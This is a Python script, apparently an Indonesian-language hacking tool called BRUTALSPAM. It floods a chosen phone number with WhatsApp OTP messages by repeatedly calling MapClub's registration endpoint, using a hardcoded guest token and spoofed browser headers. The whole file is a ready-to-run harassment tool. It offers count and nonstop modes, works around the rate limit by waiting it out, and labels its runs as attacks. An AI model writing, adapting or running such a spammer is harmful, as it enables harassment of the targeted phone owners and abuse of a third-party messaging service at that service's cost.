#!/usr/bin/env python3
"""
BRUTALSPAM - Brutal OTP Spammer for MapClub
Hardcoded Guest Token | WhatsApp OTP Registration
Created by null7
"""

import os, sys, time, json, threading, random, re
import requests
from datetime import datetime

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    C, S = Fore, Style
except:
    class Dummy:
        def __getattr__(self, name): return ''
    C = S = Dummy()

# ========== HARDCODED TOKEN ==========
HARDCODED_TOKEN = "eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJjNzMyN2I4ZC0zMTIwLTQ5NTYtYTJjNi0xNTU5MDM1NzFlNTYiLCJleHBpcmVkIjoxNzgwNjAyMzM2MzQzLCJleHBpcmUiOjM2MDAsImV4cCI6MTc4MDYwMjMzNiwiaWF0IjoxNzgwNTk4NzM2LCJwbGF0Zm9ybSI6IldFQiJ9.StZA41cJlacz_VxNOV3nup4pQ957V2ZWmOr68QCo2-d4mWATIy7WLNfzjmV8JpzZKNTnOOHhhvBEbZBDWjNolQ"

# ========== ENDPOINT ==========
OTP_URL = "https://beryllium.mapclub.com/api/member/registration/sms/otp?channel=WHATSAPP"

BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "in-ID",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/",
    "Sec-Ch-Ua": '"Not-A.Brand";v="24", "Chromium";v="146"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "Windows",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Client-Platform": "WEB",
}

BANNER = f"""
{C.RED}              ██████╗ ██████╗ ██╗   ██╗████████╗ █████╗ ██╗         ███████╗██████╗  █████╗ ███╗   ███╗
{C.RED}              ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔══██╗██║         ██╔════╝██╔══██╗██╔══██╗████╗ ████║
{C.RED}              ██████╔╝██████╔╝██║   ██║   ██║   ███████║██║         ███████╗██████╔╝███████║██╔████╔██║
{C.RED}              ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══██║██║         ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
{C.RED}              ██████╔╝██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║
{C.RED}              ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
{C.RED}                                                                                                      
{C.WHITE}                              ◆ {S.BRIGHT}BRUTAL SPAM OTP MAPCLUB{S.RESET_ALL} ◆
{C.RED}                               ═══ {S.BRIGHT}WHATSAPP SMS BOMBING{S.RESET_ALL} {C.RED}═══
{C.MAGENTA}                                        created by {S.BRIGHT}null7{S.RESET_ALL}
"""

def normalize_phone(raw):
    raw = re.sub(r'[^\d]', '', raw)
    if raw.startswith('62') and len(raw) >= 10:
        return raw
    if raw.startswith('0') and len(raw) >= 9:
        return '62' + raw[1:]
    if raw.startswith('8') and len(raw) >= 9:
        return '62' + raw
    return raw

def is_valid_phone(phone):
    return bool(re.match(r'^62\d{8,12}$', phone))

def get_current_timestamp():
    return str(int(time.time() * 1000))

def send_otp(token, phone, success_count, fail_count, lock):
    headers = BASE_HEADERS.copy()
    headers["Authorization"] = f"Bearer {token}"
    headers["Client-Timestamp"] = get_current_timestamp()
    headers["Content-Type"] = "application/json"
    payload = {"account": phone, "prefix": "62"}
    try:
        resp = requests.post(OTP_URL, json=payload, headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("success") == True:
                with lock:
                    success_count[0] += 1
                time_remaining = data.get("data", [{}])[0].get("timeRemaining", 0)
                return True, time_remaining
        with lock:
            fail_count[0] += 1
        return False, 0
    except:
        with lock:
            fail_count[0] += 1
        return False, 0

def spam_thread(token, phone, duration_seconds, lock, success_count, fail_count):
    end_time = time.time() + duration_seconds if duration_seconds > 0 else float('inf')
    while time.time() < end_time:
        ok, time_remaining = send_otp(token, phone, success_count, fail_count, lock)
        if ok and time_remaining > 0:
            wait = time_remaining / 1000 + 1
            print(f"\n  {C.YELLOW}[!]{S.RESET_ALL} Rate limit. Menunggu {C.CYAN}{int(wait)} detik{S.RESET_ALL}...")
            time.sleep(wait)
        else:
            time.sleep(random.uniform(0.5, 1.5))

def start_spam(phone, total_messages=None, duration_seconds=None):
    lock = threading.Lock()
    success_count = [0]
    fail_count = [0]
    stop_flag = False
    token = HARDCODED_TOKEN  # langsung pakai token tetap

    print(f"  {C.GREEN}✓{S.RESET_ALL} Token siap digunakan (hardcoded).")
    print(f"\n{C.YELLOW}  ◆ {S.BRIGHT}TARGET INFORMATION{S.RESET_ALL}")
    print(f"  {C.WHITE}  Phone   : {C.CYAN}{phone}{S.RESET_ALL}")
    if total_messages:
        print(f"  {C.WHITE}  Jumlah  : {C.CYAN}{total_messages} pesan{S.RESET_ALL}")
    else:
        print(f"  {C.WHITE}  Durasi  : {C.CYAN}{duration_seconds} detik (nonstop){S.RESET_ALL}")
    print()

    def progress_display():
        start_time = time.time()
        while not stop_flag:
            elapsed = time.time() - start_time
            total = success_count[0] + fail_count[0]
            print(f"\r  {C.RED}► {C.WHITE}Sent: {C.GREEN}{success_count[0]}{C.WHITE} | Failed: {C.RED}{fail_count[0]}{C.WHITE} | Total: {C.YELLOW}{total}{C.WHITE} | Elapsed: {C.CYAN}{int(elapsed)}s{S.RESET_ALL}", end="", flush=True)
            time.sleep(0.2)

    progress_thread = threading.Thread(target=progress_display)
    progress_thread.start()

    if total_messages:
        for i in range(total_messages):
            ok, time_rem = send_otp(token, phone, success_count, fail_count, lock)
            if ok and time_rem > 0:
                wait = time_rem / 1000 + 1
                print(f"\n  {C.YELLOW}[!]{S.RESET_ALL} Rate limit. Menunggu {C.CYAN}{int(wait)} detik{S.RESET_ALL}...")
                time.sleep(wait)
            else:
                time.sleep(random.uniform(0.2, 0.6))
    else:
        t = threading.Thread(target=spam_thread, args=(token, phone, duration_seconds, lock, success_count, fail_count))
        t.start()
        t.join()

    stop_flag = True
    progress_thread.join()
    print(f"\n\n  {C.RED}◆ {S.BRIGHT}ATTACK FINISHED{S.RESET_ALL}")
    print(f"  {C.WHITE}  Berhasil  : {C.GREEN}{success_count[0]}{S.RESET_ALL}")
    print(f"  {C.WHITE}  Gagal     : {C.RED}{fail_count[0]}{S.RESET_ALL}")
    print(f"  {C.WHITE}  Total     : {C.YELLOW}{success_count[0] + fail_count[0]}{S.RESET_ALL}")
    print()

def main():
    os.system("cls" if os.name=="nt" else "clear")
    print(BANNER)

    print(f"  {C.RED}◆ {S.BRIGHT}NOMOR TARGET{S.RESET_ALL}")
    print(f"  {C.WHITE}  Masukkan nomor HP (contoh: 089513286355 atau 89513286355){S.RESET_ALL}")
    raw = input(f"  {C.RED}► {C.WHITE}Nomor: {S.RESET_ALL}").strip()
    if not raw:
        print(f"  {C.RED}✗ Nomor tidak boleh kosong.{S.RESET_ALL}")
        sys.exit(1)

    phone = normalize_phone(raw)
    if not is_valid_phone(phone):
        print(f"  {C.RED}✗ Nomor tidak valid setelah konversi: {phone}{S.RESET_ALL}")
        sys.exit(1)

    account_number = phone[2:]  # tanpa "62"
    print(f"  {C.GREEN}✓{S.RESET_ALL} Nomor dikonversi: 62{C.YELLOW}{account_number}{S.RESET_ALL}")

    print(f"\n  {C.RED}◆ {S.BRIGHT}MODE SERANGAN{S.RESET_ALL}")
    print(f"  {C.WHITE}  [1] Jumlah pesan tertentu{S.RESET_ALL}")
    print(f"  {C.WHITE}  [2] Nonstop berdasarkan waktu (detik){S.RESET_ALL}")
    choice = input(f"  {C.RED}► {C.WHITE}Pilih mode (1/2): {S.RESET_ALL}").strip()

    total_messages = None
    duration_seconds = None

    if choice == "1":
        total_messages = input(f"  {C.RED}► {C.WHITE}Jumlah pesan OTP: {S.RESET_ALL}").strip()
        if not total_messages.isdigit() or int(total_messages) < 1:
            print(f"  {C.RED}✗ Jumlah tidak valid.{S.RESET_ALL}")
            sys.exit(1)
        total_messages = int(total_messages)
    elif choice == "2":
        duration_seconds = input(f"  {C.RED}► {C.WHITE}Durasi (detik): {S.RESET_ALL}").strip()
        if not duration_seconds.isdigit() or int(duration_seconds) < 1:
            print(f"  {C.RED}✗ Durasi tidak valid.{S.RESET_ALL}")
            sys.exit(1)
        duration_seconds = int(duration_seconds)
    else:
        print(f"  {C.RED}✗ Pilihan tidak valid.{S.RESET_ALL}")
        sys.exit(1)

    print(f"\n  {C.RED}◆ {S.BRIGHT}KONFIRMASI{S.RESET_ALL}")
    print(f"  {C.WHITE}  Nomor: {C.YELLOW}62{account_number}{S.RESET_ALL}")
    if total_messages:
        print(f"  {C.WHITE}  Mode : {C.YELLOW}{total_messages} pesan{S.RESET_ALL}")
    else:
        print(f"  {C.WHITE}  Mode : {C.YELLOW}Nonstop {duration_seconds} detik{S.RESET_ALL}")
    confirm = input(f"  {C.RED}► {C.WHITE}Mulai serangan? (y/n): {S.RESET_ALL}").strip().lower()
    if confirm != 'y':
        print(f"  {C.RED}  Serangan dibatalkan.{S.RESET_ALL}")
        sys.exit(0)

    print(f"\n  {C.RED}◆ {S.BRIGHT}ATTACK IN PROGRESS{S.RESET_ALL}")
    print(f"  {C.WHITE}  Tekan {C.RED}Ctrl+C{C.WHITE} untuk berhenti paksa.{S.RESET_ALL}")
    print(f"  {C.YELLOW}[!]{S.RESET_ALL} OTP akan dikirim setiap ~60 detik (rate limit MapClub).\n")
    try:
        start_spam(account_number, total_messages, duration_seconds)
    except KeyboardInterrupt:
        print(f"\n  {C.RED}◆ {S.BRIGHT}ATTACK INTERRUPTED{S.RESET_ALL}")
        print(f"  {C.MAGENTA}  null7 says goodbye.{S.RESET_ALL}\n")
        sys.exit(0)

if __name__ == "__main__":
    main()